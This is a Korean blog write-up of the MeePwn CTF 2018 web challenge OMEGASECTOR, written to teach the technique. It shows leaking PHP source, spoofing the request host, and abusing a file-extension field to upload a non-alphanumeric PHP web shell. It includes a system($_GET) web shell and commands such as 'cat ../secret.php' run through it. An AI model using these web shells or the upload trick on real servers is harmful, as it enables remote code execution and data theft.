---
title: "[MeePwn2018] OMEGASECTOR Write up"
date: 2018-07-18
draft: false
category: [ctf]
subcategories: [2018]
tags: [Write-up, CTF, MeePwn2018]
---

OMEGASECTOR 문제는 가장 오랜 시간 ~~그렇다고 해도 길진 않았지만~~ 고민했던 문제이다.
역시나 대회 기간에는 풀지 못했다(ㅠㅠ).
풀이를 보며 `아 왜 난 이 생각을 못했었지!` 한 점이 많아서 Write up을 작성 해 본다.  

<!--more-->

문제 정보는 다음과 같다.  

```plain
Wtf !? I just want to go to OmegaSector but there is weird authentication here, please help me
http://138.68.228.12/
```

문제에 접속하면 아래와 같은 페이지가 있으며, 소스코드를 확인 해 보면 아래와 같다.
~~베트남까지 메이플이 퍼졌나보다~~

![](/images/CTF/MeePwn2018/omegasector/omega_01.PNG)

```html
<html>
<style type="text/css">* {cursor: url(assets/maplcursor.cur), auto !important;}</style>
<head>
  <link rel="stylesheet" href="assets/omega_sector.css">
  <link rel="stylesheet" href="assets/tsu_effect.css">
</head>

<h2 id="intro" class="neon">Seems like you are not belongs to this place, please comeback to ludibrium!</h2><img src="assets/map.jpg" id="taxi" width="55%" height="55%" /><body background="assets/background.jpg" class="cenback">
</body>
<!-- is_debug=1 -->
<!-- All images/medias credit goes to nexon, wizet -->
</html>
```

소스코드에서 보면 `is_debug=1`이라는 부분이 있다.
때문에 `http://138.68.228.12/?is_debug=1`로 접속하면 소스코드를 확인할 수 있다.  

```php
<?php 
ob_start(); 
session_start(); 
?> 
<html> 
<style type="text/css">* {cursor: url(assets/maplcursor.cur), auto !important;}</style> 
<head> 
  <link rel="stylesheet" href="assets/omega_sector.css"> 
  <link rel="stylesheet" href="assets/tsu_effect.css"> 
</head> 

<?php 

ini_set("display_errors", 0); 
include('secret.php'); 

$remote=$_SERVER['REQUEST_URI']; 

if(strpos(urldecode($remote),'..')) 
{ 
mapl_die(); 
} 

if(!parse_url($remote, PHP_URL_HOST)) 
{ 
    $remote='http://'.$_SERVER['REMOTE_ADDR'].$_SERVER['REQUEST_URI']; 
} 
$whoareyou=parse_url($remote, PHP_URL_HOST); 


if($whoareyou==="alien.somewhere.meepwn.team") 
{ 
    if(!isset($_GET['alien'])) 
    { 
        $wrong = ' 
<h2 id="intro" class="neon">You will be driven to hidden-street place in omega sector which is only for alien! Please verify your credentials first to get into the taxi!</h2> 
<h1 id="main" class="shadow">Are You ALIEN??</h1> 
<form id="main"> 
    <button type="submit" class="button-success" name="alien" value="Yes">Yes</button> 
    <button type="submit" class="button-error" name="alien" value="No">No</button> 
</form> 
<img src="assets/taxi.png" id="taxi" width="15%" height="20%" /> 
'; 
        echo $wrong; 
    } 
    if(isset($_GET['alien']) and !empty($_GET['alien'])) 
    { 
         if($_GET['alien']==='@!#$@!@@') 
        { 
            $_SESSION['auth']=hash('sha256', 'alien'.$salt); 
            exit(header( "Location: alien_sector.php" )); 
        } 
        else 
        { 
            mapl_die(); 
        } 
    } 

} 
elseif($whoareyou==="human.ludibrium.meepwn.team") 
{ 
     
    if(!isset($_GET['human'])) 
    { 
        echo ""; 
        $wrong = ' 
<h2 id="intro" class="neon">hellu human, welcome to omega sector, please verify your credentials to get into the taxi!</h2> 
<h1 id="main" class="shadow">Are You Human?</h1> 
<form id="main"> 
    <button type="submit" class="button-success" name="human" value="Yes">Yes</button> 
    <button type="submit" class="button-error" name="human" value="No">No</button> 
</form> 
<img src="assets/taxi.png" id="taxi" width="15%" height="20%" /> 
'; 
        echo $wrong; 
    } 
    if(isset($_GET['human']) and !empty($_GET['human'])) 
    { 
         if($_GET['human']==='Yes') 
        { 
            $_SESSION['auth']=hash('sha256', 'human'.$salt); 
            exit(header( "Location: omega_sector.php" )); 
        } 
        else 
        { 
            mapl_die(); 
        } 
    } 

} 
else 
{ 
    echo '<h2 id="intro" class="neon">Seems like you are not belongs to this place, please comeback to ludibrium!</h2>'; 
    echo '<img src="assets/map.jpg" id="taxi" width="55%" height="55%" />'; 
    if(isset($_GET['is_debug']) and !empty($_GET['is_debug']) and $_GET['is_debug']==="1") 
    { 
        show_source(__FILE__); 
    } 
} 

?> 
<body background="assets/background.jpg" class="cenback"> 
</body> 
<!-- is_debug=1 --> 
<!-- All images/medias credit goes to nexon, wizet --> 
</html> 
<?php ob_end_flush(); ?> 
```

소스코드 분석 결과 `REQUEST_URI`를 parse_url 한 결과 domain의 값이 `alien.somewhere.meepwn.team` 혹은 `human.ludibrium.meepwn.team`여야 한다.
또한 `alien.somewhere.meepwn.team`일 경우, 쿼리 스트링으로 `?alien=@!#$@!@@`을 주어야 하며, `human.ludibrium.meepwn.team`일 경우에는 `?human=Yes`를 주어야 한다.  

여기서, `REQUEST_URI`는 URL 중 `/` 뒤를 이야기 한다.
예를 들어 URL이 `http://example.com/index.php?a=123` 일 경우, `/` 뒤의 `index.php?a=123` 만을 말한다.
`parse_url` 함수에 취약점이 있을 것 같아 인터넷을 뒤져보던 중, 아래의 두 링크를 찾을 수 있었다.  

* [https://www.hahwul.com/2017/09/web-hacking-new-attack-vectors-in.html](https://www.hahwul.com/2017/09/web-hacking-new-attack-vectors-in.html)
* [https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)

여기에서 나온 기법을 바탕으로 다양하게 시도 해 보았지만 아무것도 성공할 수 없었다.

그런데 대회 종료 후 공개된 Write up을 보니 다들 Burp Suite를 사용했다.
왜 이 생각을 못했는지 정말 안타까웠다.
Burp Suite를 실행시킨 후 헤더를 아래와 같이 조작하면 `alien` 혹은 `human` 페이지를 확인할 수 있다.  

![](/images/CTF/MeePwn2018/omegasector/omega_02.PNG)

![](/images/CTF/MeePwn2018/omegasector/omega_03.PNG)

다시 Burp Suite를 이용 해 아래의 값으로 헤더를 조작하면 `alien_sector.php`와 `omega_sector.php`도 확인할 수 있다.  

```plain
http://alien.somewhere.meepwn.team/?alien=%40%21%23%24%40%21%40%40
http://human.ludibrium.meepwn.team/?human=Yes
```

* alien_sector.php

![](/images/CTF/MeePwn2018/omegasector/omega_04.PNG)

![](/images/CTF/MeePwn2018/omegasector/omega_05.PNG)

* omega_sector.php

![](/images/CTF/MeePwn2018/omegasector/omega_06.PNG)

![](/images/CTF/MeePwn2018/omegasector/omega_07.PNG)


각각의 소스코드를 살펴보면 다음과 같다.  

* alien_sector.php

```html
<html>
<style type="text/css">* {cursor: url(assets/maplcursor.cur), auto !important;}</style>
<head>
  <link rel="stylesheet" href="assets/omega_sector.css">
  <link rel="stylesheet" href="assets/tsu_effect.css">
</head>

<div class="alien_language">
<h2 id="intro" class="neon">Looks like the aliens aren't here, so please leave the message, they will come later.</h2>
</div>
<form action="alien_sector.php" method="POST">
<textarea class="shadow" id="main" name="message"></textarea>
<input type='text' name='type' value='alien' hidden />
<button type="submit" id="button"><div class="alien_language">Save</div></button>
</form>
<body background="assets/alien_sector.jpg" class="cenback"></body>
<audio controls autoplay hidden>
  <source src="assets/omegasector.mp3" type="audio/mpeg">
</audio>
</html>
```

* omega_sector.php

```html
<html>
<style type="text/css">* {cursor: url(assets/maplcursor.cur), auto !important;}</style>
<head>
  <link rel="stylesheet" href="assets/omega_sector.css">
  <link rel="stylesheet" href="assets/tsu_effect.css">
</head>

<h2 id="intro" class="neon">Its MesoRangers Time!!!! Please cheer us via your letter ^_^</h2>
<form action="omega_sector.php" method="POST">
<textarea class="shadow" id="main" name="message"></textarea>
<input type='text' name='type' value='human' hidden />
<button type="submit" id="button">Save</button>
</form>
<img src="assets/mesoranger.png" id="rangers" />
<body background="assets/omega_sector.jpg" class="cenback"></body>
<audio controls autoplay hidden>
  <source src="assets/omegasector.mp3" type="audio/mpeg">
</audio>
</html>
```

각각의 페이지에선 `message`를 남길 수 있다.
message를 남길 경우, `alien_sector.php`에서는 `alien_message/hash_value.alien`으로, `omega_sector.php`에서는 `human_message/hash_value.human`으로 파일을 생성 해 준다.  

* alien_sector.php

![](/images/CTF/MeePwn2018/omegasector/omega_08.PNG)

![](/images/CTF/MeePwn2018/omegasector/omega_09.PNG)

![](/images/CTF/MeePwn2018/omegasector/omega_10.PNG)

* omega_sector.php

![](/images/CTF/MeePwn2018/omegasector/omega_11.PNG)

![](/images/CTF/MeePwn2018/omegasector/omega_12.PNG)

![](/images/CTF/MeePwn2018/omegasector/omega_13.PNG)

각 페이지에서 메시지를 생성할 때, 메시지 본문 뿐 아니라 `type`또 함께 전송되는 것을 확인할 수 있다.
이는 각각 `alien`과 `human`으로, 각 페이지에서 생성되는 파일의 확장자와 동일하다는 것을 알 수 있다.
만약 `type`을 `abc`로 바꾼다면, `*_message/hash_value.abc`로 바뀌어 저장된다.
따라서 `type`은 파일의 확장자를 설정한다는 것을 알 수 있으며, `type`의 값을 `php`로 둔다면 해당 파일의 내용은 `message`가 되므로, 우리가 원하는 코드를 실행시킬 수 있다.  

그런데, `alien_sector.php`에서는 `?`나 `_` 등의 특수문자만 입력되고, 알파벳을 입력 할 경우에는 `Uh huh? Wut is this language?`를 출력한다.
(참고로 `alien_sector.php`에서는 외계어로 출력되기 때문에, `개발자 도구`나 `Burp Suite`를 이용 해 평문을 확인해야 한다.)
반면, `omega_sector.php`에서는 알파벳이 잘 입력 되지만, 특수문자를 입력 할 경우에는 `Uh huh? Wut is this language?`를 출력 한다.  

즉, 아래의 두 가지 방법 중 하나를 사용해 flag를 읽어야 한다.  

> 1. 특수문자만으로 내가 원하는 명령어를 실행시킨다.  
> 2. 특수문자 없이 알파멧 만으로 내가 원하는 명령어를 실행시킨다.  

모든 소스코드는 특수문자 없이 구현하기가 매우 어렵다.
따라서 `와일드 카드` 등을 이용 해 특수문자만으로 원하는 명령어를 실행시키는 것이 더 수월할 수 있다.

때문에 `alien_sector.php`를 사용 해 문제를 풀기로 했다.
그런데 나는 flag가 어디에 있는지 모르기 때문에 이를 손쉽게 탐색하기 위해서는 웹쉘을 업로드 하는 것이 편하다.
만약 문자의 제한이 없다면 내가 업로드 할 웹쉘 코드는 다음과 같다.  

```php
<?php
  system($_GET['a']);
?>
```

이 경우, 쿼리 스트링으로 `?a=ls` 혹은 `?a=cat flag` 등을 전달 해 준다면 해당 값이 `system` 함수의 인자로 들어가 내가 원하는 명령어를 실행할 수 있게 된다.
하지만 이 문제에서는 문자의 제한이 있으므로, 해당 코드를 특수문자로만 구현해야 한다.
고민하던 중, [여기](https://rawsec.ml/en/MeePwn-2018-write-up/#omegasector-web)에서 방법을 찾을 수 있었다.  

![](/images/CTF/MeePwn2018/omegasector/omega_14.PNG)

코드를 보기 좋게 정리하면 다음과 같다.  

![](/images/CTF/MeePwn2018/omegasector/omega_15.PNG)

![](/images/CTF/MeePwn2018/omegasector/omega_16.PNG)

결과적으로 위의 함수는 아래와 같다.  

```php
<?=$_GET[_]($_GET[__]);
```

따라서 해당 페이지에 접속한 후 `?_=system&__=ls`와 같이 인자를 넘겨 준다면, 결국 `system(ls)`가 되어 `ls` 명령어를 실행한다.
즉, 내가 원하는 명령어를 자유롭게 실행시킬 수 있게된다.
먼저 해당 문자열을 `message`에 적고, `type`은 `php`로 해 아래와 같이 파일을 생성 해 주었다.  

![](/images/CTF/MeePwn2018/omegasector/omega_17.PNG)

![](/images/CTF/MeePwn2018/omegasector/omega_18.PNG)

이 후 생성된 파일에 직접 접근하며, `?_=system&__=ls`를 쿼리스트링으로 넘겨주었다.  

![](/images/CTF/MeePwn2018/omegasector/omega_19.PNG)

그 결과, 아래와 같이 `ls` 명령어가 실행된 것을 확인할 수 있었다.  

![](/images/CTF/MeePwn2018/omegasector/omega_20.PNG)

현재 디렉토리인 `alien_message` 디렉토리에는 플래그로 보이는 값이 없어, 상위 디렉토리를 확인하기 위해 `?_=system&__=ls ../`를 쿼리스트링으로 넘겨주었다.
그 결과 아래와 같은 파일들을 확인할 수 있었다.  

```plain
alien_message
alien_sector.php
assets
human_message
index.php
omega_sector.php
secret.php
```

그 중 가장 의심스로운 `secret.php` 파일을 확인하기 위해 `?_=system&__=cat ../secret.php`를 넘겨주었다.
그 결과 이번에도 역시 주석에서 flag를 발견할 수 있었다.  

![](/images/CTF/MeePwn2018/omegasector/omega_21.PNG)

```plain
FLAG : MeePwnCTF{__133-221-333-123-111___}
```
